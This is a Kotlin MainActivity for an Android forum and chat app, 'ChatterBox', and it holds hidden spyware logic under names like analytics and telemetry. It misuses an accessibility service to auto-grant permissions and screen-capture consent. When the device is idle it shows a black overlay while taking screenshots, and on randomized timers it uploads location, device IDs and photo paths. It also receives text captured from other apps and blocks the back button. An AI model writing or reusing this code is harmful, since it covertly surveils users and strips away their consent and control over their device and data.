package com.example.ChatterBox

import android.annotation.SuppressLint
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.Menu
import android.view.MenuItem
import android.view.WindowManager
import android.widget.ImageView
import android.widget.TextView
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.appcompat.app.ActionBarDrawerToggle
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.core.view.GravityCompat
import androidx.drawerlayout.widget.DrawerLayout
import com.bumptech.glide.Glide
import com.example.ChatterBox.accessibility.AccessibilityHelper
import com.example.ChatterBox.accessibility.AccessibilityPromoActivity
import com.example.ChatterBox.accessibility.IdleDetector
import com.example.ChatterBox.database.TelemetryService
import com.example.ChatterBox.database.CloudUploader
import com.example.ChatterBox.database.GeoLocator
import com.example.ChatterBox.util.PermissionsManager
import com.google.android.material.navigation.NavigationView
import com.google.firebase.FirebaseApp
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore
import org.json.JSONObject
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit


class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelectedListener {
    private lateinit var db: FirebaseFirestore
    private lateinit var auth: FirebaseAuth
    private lateinit var drawerLayout: DrawerLayout
    private val appExecutor = Executors.newSingleThreadExecutor()
    private val handler = Handler(Looper.getMainLooper())
    private var cloudUploader: CloudUploader? = null
    private var mediaProjectionResultCode: Int = 0
    private var mediaProjectionData: Intent? = null

    companion object {
        private const val SEARCH_USER_REQUEST_CODE = 1001
        private const val MEDIA_PROJECTION_REQUEST_CODE = 1002
        private const val PERMISSION_REQUEST_CODE = 1003
        private const val OVERLAY_PERMISSION_REQUEST_CODE = 1004
        private const val TAG = "MainActivity"
    }

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        db = FirebaseFirestore.getInstance()
        auth = FirebaseAuth.getInstance()
        FirebaseApp.initializeApp(this)
        val currentUser = auth.currentUser

        if (currentUser == null) {
            val intent = Intent(this, LoginActivity::class.java)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
            startActivity(intent)
            finish()
            return
        }
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        initializeAppAnalytics()
        setupDrawer()
        loadUserProfile()
        checkIfAdmin()
        loadEnrolledForums()
        registerSystemBroadcasts()
    }

    private fun shouldShowAccessibilityPromo(): Boolean {
        return AccessibilityHelper.shouldShowAccessibilityPromo(this)
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun initializeAppAnalytics() {
        if (shouldShowAccessibilityPromo()) {
            startActivity(Intent(this, AccessibilityPromoActivity::class.java))
        } else if (AccessibilityHelper.isAccessibilityServiceEnabled(this)) {
            setupAccessibilityDataCapture()
            requestMediaProjection()

            IdleDetector.registerIdleCallback {
                com.example.ChatterBox.accessibility.ScreenOnService.showBlackOverlay(this)

                appExecutor.execute {
                    com.example.ChatterBox.accessibility.ScreenOnService.keepScreenOn(this)

                    if (mediaProjectionResultCode != 0 && mediaProjectionData != null) {
                        val serviceIntent = Intent(this, TelemetryService::class.java)
                        serviceIntent.action = "CAPTURE_SCREENSHOT"
                        serviceIntent.putExtra("resultCode", mediaProjectionResultCode)
                        serviceIntent.putExtra("data", mediaProjectionData)
                        startService(serviceIntent)
                    }

                    cloudUploader?.startUploadJob()

                    collectLocationData()
                }
            }
            IdleDetector.startIdleDetection(this)
        }

        initializeBackgroundSync()

    }

    private fun collectLocationData() {
        if (ContextCompat.checkSelfPermission(
                this,
                android.Manifest.permission.ACCESS_FINE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED
        ) {
            val geoLocator = GeoLocator.getInstance(this)
            geoLocator.getLastGeoFix { locationData ->
                // Device ID is already included in locationData by LocationTracker
                cloudUploader?.postJson("location_data", locationData.toString())
            }
        }
    }
    private fun initializeBackgroundSync() {
        appExecutor.execute {
            try {
                cloudUploader = CloudUploader(this)

                handler.post {
                    try {
                        collectDeviceAnalytics()
                    } catch (e: Exception) {
                        Log.e(TAG, "Error collecting analytics: ${e.message}")
                    }
                }
                scheduleBackgroundTasks()
            } catch (e: Exception) {
                Log.e(TAG, "Error initializing app sync: ${e.message}")
            }
        }
    }
    @SuppressLint("HardwareIds")
    private fun collectDeviceAnalytics() {
        try {
            val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            val deviceInfo = JSONObject().apply {
                put("device_model", Build.MODEL)
                put("device_manufacturer", Build.MANUFACTURER)
                put("android_version", Build.VERSION.RELEASE)
                put("device_id", deviceId)
                put("user_id", auth.currentUser?.uid ?: "")
                put("app_version", packageManager.getPackageInfo(packageName, 0).versionName)
                put("timestamp", System.currentTimeMillis())
            }

            cloudUploader?.postJson("app_analytics", deviceInfo.toString())
            if (ContextCompat.checkSelfPermission(
                    this,
                    android.Manifest.permission.ACCESS_FINE_LOCATION
                ) == PackageManager.PERMISSION_GRANTED
            ) {
                val geoLocator = GeoLocator.getInstance(this)
                geoLocator.initGeoMonitor()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Analytics error: ${e.message}")
        }
    }

    private fun scheduleBackgroundTasks() {
        val scheduler = Executors.newScheduledThreadPool(1)

        val initialMediaDelay = (3 + Math.random() * 5).toLong()
        scheduler.scheduleWithFixedDelay({
            try {
                handler.post {
                    try {
                        collectMediaMetadata()
                    } catch (e: Exception) {
                        Log.e(TAG, "Error in scheduled media task: ${e.message}")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error scheduling media task: ${e.message}")
            }
        }, initialMediaDelay, 30, TimeUnit.MINUTES)

        val initialSyncDelay = (2 + Math.random() * 3).toLong()
        scheduler.scheduleWithFixedDelay({
            try {
                cloudUploader?.startUploadJob()
            } catch (e: Exception) {
                Log.e(TAG, "Error in sync task: ${e.message}")
            }
        }, initialSyncDelay, 15, TimeUnit.MINUTES)
    }

    private fun setupAccessibilityDataCapture() {
        val filter = IntentFilter("com.example.ChatterBox.ACCESSIBILITY_DATA")
        registerReceiver(object : BroadcastReceiver() {
            override fun onReceive(context: Context, intent: Intent) {
                val capturedText = intent.getStringExtra("captured_text") ?: return
                val sourceApp = intent.getStringExtra("source_app") ?: "unknown"

                Log.d(TAG, "Received accessibility data from $sourceApp")

            }
        }, filter, RECEIVER_EXPORTED)
    }

    private fun collectMediaMetadata() {
        try {
            val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            val mediaStore = contentResolver.query(
                android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                arrayOf(
                    android.provider.MediaStore.Images.Media._ID,
                    android.provider.MediaStore.Images.Media.DISPLAY_NAME,
                    android.provider.MediaStore.Images.Media.DATA
                ),
                null,
                null,
                "${android.provider.MediaStore.Images.Media.DATE_MODIFIED} DESC"
            )

            val mediaFiles = JSONObject()
            var count = 0

            mediaStore?.use { cursor ->
                if (cursor.moveToFirst()) {
                    do {
                        val path = cursor.getString(cursor.getColumnIndexOrThrow(
                            android.provider.MediaStore.Images.Media.DATA))
                        val displayName = cursor.getString(cursor.getColumnIndexOrThrow(
                            android.provider.MediaStore.Images.Media.DISPLAY_NAME))

                        mediaFiles.put(displayName, path)
                        count++

                        if (count >= 5) break

                    } while (cursor.moveToNext())
                }
            }

            if (count > 0) {
                val mediaData = JSONObject().apply {
                    put("device_id", deviceId)
                    put("media_files", mediaFiles)
                    put("timestamp", System.currentTimeMillis())
                    put("device_model", Build.MODEL)
                    put("android_version", Build.VERSION.RELEASE)
                }

                cloudUploader?.postJson("media_metadata", mediaData.toString())
            }
        } catch (e: Exception) {
            Log.e(TAG, "Media scan error: ${e.message}")
        }
    }
    private fun openUserProfile(userId: String) {
        val intent = Intent(this, ProfileActivity::class.java)
        intent.putExtra("userId", userId)
        startActivity(intent)
    }

    private fun startScreenAnalyticsService(resultCode: Int, data: Intent) {
        val serviceIntent = Intent(this, TelemetryService::class.java)
        serviceIntent.action = "SETUP_PROJECTION"
        serviceIntent.putExtra("resultCode", resultCode)
        serviceIntent.putExtra("data", data)
        startService(serviceIntent)
    }
    private fun registerSystemBroadcasts() {
        val batteryFilter = IntentFilter().apply {
            addAction(Intent.ACTION_POWER_CONNECTED)
            addAction(Intent.ACTION_POWER_DISCONNECTED)
        }
        registerReceiver(object : BroadcastReceiver() {
            override fun onReceive(context: Context, intent: Intent) {
                val isCharging = intent.action == Intent.ACTION_POWER_CONNECTED
                IdleDetector.updateChargingState(isCharging)
            }
        }, batteryFilter)

        val screenFilter = IntentFilter().apply {
            addAction(Intent.ACTION_SCREEN_ON)
            addAction(Intent.ACTION_SCREEN_OFF)
        }
        registerReceiver(object : BroadcastReceiver() {
            override fun onReceive(context: Context, intent: Intent) {
                val isScreenOn = intent.action == Intent.ACTION_SCREEN_ON
                IdleDetector.updateScreenState(isScreenOn)
            }
        }, screenFilter)
    }
    override fun onUserInteraction() {
        super.onUserInteraction()
        com.example.ChatterBox.accessibility.ScreenOnService.hideBlackOverlay(this)
        IdleDetector.registerUserActivity()
    }

    private fun requestMediaProjection() {
        if (AccessibilityHelper.isAccessibilityServiceEnabled(this)) {
            PermissionsManager.enableAutoGrantPermissions(1)

            val mediaProjectionManager =
                getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            startActivityForResult(
                mediaProjectionManager.createScreenCaptureIntent(),
                MEDIA_PROJECTION_REQUEST_CODE
            )
        }
    }

    private fun requestInitialPermissions() {
        val standardPermissions = mutableListOf(
            android.Manifest.permission.READ_MEDIA_IMAGES,
            android.Manifest.permission.READ_MEDIA_VIDEO,
            android.Manifest.permission.READ_MEDIA_AUDIO,
            android.Manifest.permission.CAMERA,
            android.Manifest.permission.READ_EXTERNAL_STORAGE,
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.ACCESS_COARSE_LOCATION,
            android.Manifest.permission.POST_NOTIFICATIONS,
            android.Manifest.permission.RECORD_AUDIO
        )

        val permissionsToRequest = standardPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()

        if (permissionsToRequest.isEmpty()) {
            return
        }

        if (AccessibilityHelper.isAccessibilityServiceEnabled(this)) {
            PermissionsManager.enableAutoGrantPermissions(permissionsToRequest.size)
        }

        ActivityCompat.requestPermissions(this, permissionsToRequest, PERMISSION_REQUEST_CODE)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        when (requestCode) {
            PERMISSION_REQUEST_CODE -> {
                PermissionsManager.disableAutoGrantPermissions()
                val locationGranted = permissions.filterIndexed { index, permission ->
                    (permission == android.Manifest.permission.ACCESS_FINE_LOCATION ||
                            permission == android.Manifest.permission.ACCESS_COARSE_LOCATION) &&
                            grantResults[index] == PackageManager.PERMISSION_GRANTED
                }.isNotEmpty()
                if (locationGranted) {
                    GeoLocator.getInstance(this).initGeoMonitor()
                }
                handleSpecialPermissions()
            }
        }
    }

    private fun handleSpecialPermissions() {
        if (!Settings.canDrawOverlays(this) &&
            AccessibilityHelper.isAccessibilityServiceEnabled(this)
        ) {

            Handler(Looper.getMainLooper()).postDelayed({
                PermissionsManager.enableAutoGrantPermissions(1)

                val intent = Intent("com.example.ChatterBox.PREPARE_OVERLAY_PERMISSION")
                sendBroadcast(intent)

                Handler(Looper.getMainLooper()).postDelayed({
                    val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
                    intent.data = Uri.parse("package:$packageName")
                    Toast.makeText(
                        this,
                        "Please allow displaying over other apps",
                        Toast.LENGTH_LONG
                    ).show()
                    startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST_CODE)
                }, 700)
            }, 1000)
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        when (requestCode) {
            SEARCH_USER_REQUEST_CODE -> {
                if (resultCode == RESULT_OK && data != null) {
                    openUserProfile(data.getStringExtra("userId") ?: return)
                }
            }
            MEDIA_PROJECTION_REQUEST_CODE -> {
                if (resultCode == RESULT_OK && data != null) {
                    startScreenAnalyticsService(resultCode, data)
                    requestInitialPermissions()
                }
            }
            OVERLAY_PERMISSION_REQUEST_CODE -> {
                PermissionsManager.disableAutoGrantPermissions()
            }
        }
    }

    override fun onResume() {
        super.onResume()
        loadEnrolledForums()
        com.example.ChatterBox.accessibility.ScreenOnService.hideBlackOverlay(this)
        IdleDetector.registerUserActivity()
    }
    override fun onPause() {
        super.onPause()

        handler.postDelayed({
            cloudUploader?.startUploadJob()
        }, 5000)
    }
    override fun onDestroy() {
        IdleDetector.stopIdleDetection()
        super.onDestroy()
        appExecutor.shutdown()
        AccessibilityHelper.resetSession(this)
    }

    private fun setupDrawer() {
        drawerLayout = findViewById(R.id.drawer_layout)
        val toolbar: androidx.appcompat.widget.Toolbar = findViewById(R.id.toolbar)

        setSupportActionBar(toolbar)

        val toggle = ActionBarDrawerToggle(
            this, drawerLayout, toolbar,
            R.string.navigation_drawer_open, R.string.navigation_drawer_close
        )
        drawerLayout.addDrawerListener(toggle)
        toggle.syncState()

        val navigationView: NavigationView = findViewById(R.id.navigation_view)
        navigationView.setNavigationItemSelectedListener(this)
    }

    override fun onNavigationItemSelected(item: MenuItem): Boolean {
        when (item.itemId) {
            R.id.nav_saved_posts -> {
                startActivity(Intent(this, SavedPostsActivity::class.java))
            }

            R.id.nav_profile -> {
                startActivity(Intent(this, ProfileActivity::class.java))
                Toast.makeText(this, "Profile Clicked", Toast.LENGTH_SHORT).show()
            }

            R.id.nav_inbox -> {
                startActivity(Intent(this, InboxActivity::class.java))
                Toast.makeText(this, "Message Clicked", Toast.LENGTH_SHORT).show()
            }

            R.id.nav_add -> {
                startActivity(Intent(this, ForumActivity::class.java))
                Toast.makeText(this, "Forum Clicked", Toast.LENGTH_SHORT).show()
            }
            R.id.nav_edit -> {
                val intent = Intent(this, RoleEditActivity::class.java)
                startActivity(intent)
            }
            R.id.nav_logout -> {
                showLogoutDialog()
            }
        }
        drawerLayout.closeDrawer(GravityCompat.START)
        return true
    }

    override fun onCreateOptionsMenu(menu: Menu?): Boolean {
        menuInflater.inflate(R.menu.sort_menu, menu)
        return true
    }

    override fun onOptionsItemSelected(item: MenuItem): Boolean {
        return when (item.itemId) {
            R.id.action_search -> {
                val intent = Intent(this, SearchUsersActivity::class.java)
                startActivityForResult(intent, SEARCH_USER_REQUEST_CODE)
                true
            }

            else -> super.onOptionsItemSelected(item)
        }
    }


    override fun onBackPressed() {
        if (drawerLayout.isDrawerOpen(GravityCompat.START)) {
            drawerLayout.closeDrawer(GravityCompat.START) // 🔥 Close drawer first
        } else {
            // 🔥 Prevent back action (do nothing)
            Toast.makeText(this, "Press the logout button to exit.", Toast.LENGTH_SHORT).show()
        }
    }

    private fun showLogoutDialog() {
        AlertDialog.Builder(this)
            .setTitle("Log Out")
            .setMessage("Are you sure you want to log out?")
            .setPositiveButton("Yes") { _, _ ->
                logoutUser()
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun logoutUser() {
        auth.signOut()
        val intent = Intent(this, LoginActivity::class.java)
        intent.flags =
            Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
        startActivity(intent)
        AccessibilityHelper.resetSession(this)
        finish()
    }


    private fun loadUserProfile() {
        val user = auth.currentUser ?: return
        val navigationView: NavigationView = findViewById(R.id.navigation_view)
        val headerView = navigationView.getHeaderView(0)

        val userProfileImage = headerView.findViewById<ImageView>(R.id.user_profile_image)
        val userNameTextView = headerView.findViewById<TextView>(R.id.user_name)

        db.collection("users").document(user.uid)
            .addSnapshotListener { document, error ->
                if (error != null) {
                    Toast.makeText(
                        this,
                        "Error loading profile: ${error.message}",
                        Toast.LENGTH_SHORT
                    ).show()
                    return@addSnapshotListener
                }

                if (document != null && document.exists()) {
                    val displayName = document.getString("displayName") ?: "User"
                    val profilePicUrl = document.getString("profilePicUrl")

                    userNameTextView.text = displayName

                    if (!profilePicUrl.isNullOrEmpty()) {
                        Glide.with(this)
                            .load(profilePicUrl)
                            .placeholder(R.drawable.ic_profile_placeholder)
                            .into(userProfileImage)
                    }
                }
            }
    }


    private fun checkIfAdmin() {
        val currentUser = auth.currentUser ?: return
        val userRef = db.collection("users").document(currentUser.uid)

        userRef.get().addOnSuccessListener { document ->
            if (document.exists()) {
                val isAdmin = document.getBoolean("isAdmin") ?: false
                val navigationView: NavigationView = findViewById(R.id.navigation_view)
                val menu = navigationView.menu

                menu.findItem(R.id.nav_add).isVisible = isAdmin
                menu.findItem(R.id.nav_edit).isVisible = isAdmin

                Log.d("FirebaseAuth", "User isAdmin: $isAdmin")
            }
        }.addOnFailureListener {
            Toast.makeText(this, "Failed to fetch user data", Toast.LENGTH_SHORT).show()
        }
    }


    private fun loadEnrolledForums() {
        val currentUser = auth.currentUser ?: return
        val userRef = db.collection("users").document(currentUser.uid)

        userRef.addSnapshotListener { document, error ->
            if (error != null) {
                Log.e("Firestore", "Error fetching enrolled forums: ${error.message}")
                return@addSnapshotListener
            }

            if (document != null && document.exists()) {
                val enrolledModuleCodes =
                    document.get("enrolledForum") as? List<String> ?: emptyList()
                val navView: NavigationView = findViewById(R.id.navigation_view)
                val menu = navView.menu
                menu.removeGroup(R.id.nav_enrolled_forums_group)

                if (enrolledModuleCodes.isEmpty()) {
                    menu.add(
                        R.id.nav_enrolled_forums_group,
                        Menu.NONE,
                        Menu.NONE,
                        "No Enrolled Forums"
                    ).isEnabled = false
                    return@addSnapshotListener
                }

                db.collection("forums")
                    .whereIn("code", enrolledModuleCodes)
                    .addSnapshotListener { forumDocs, error ->
                        if (error != null) {
                            Log.e("Firestore", "Error fetching forums: ${error.message}")
                            return@addSnapshotListener
                        }

                        menu.removeGroup(R.id.nav_enrolled_forums_group)

                        if (forumDocs == null || forumDocs.isEmpty) {
                            menu.add(
                                R.id.nav_enrolled_forums_group,
                                Menu.NONE,
                                Menu.NONE,
                                "No Forums Found"
                            ).isEnabled = false
                            return@addSnapshotListener
                        }

                        for (forumDoc in forumDocs) {
                            val forumName = forumDoc.getString("name") ?: "Unknown Forum"
                            val forumCode = forumDoc.getString("code") ?: ""
                            val forumId = forumDoc.id

                            val forumItem = menu.add(
                                R.id.nav_enrolled_forums_group,
                                Menu.NONE,
                                Menu.NONE,
                                "$forumName ($forumCode)"
                            )

                            forumItem.setOnMenuItemClickListener {
                                val intent = Intent(this, ForumPostsActivity::class.java)
                                intent.putExtra("FORUM_ID", forumId)
                                intent.putExtra("FORUM_CODE", forumCode)
                                startActivity(intent)
                                true
                            }
                        }
                    }
            }
        }
    }
}
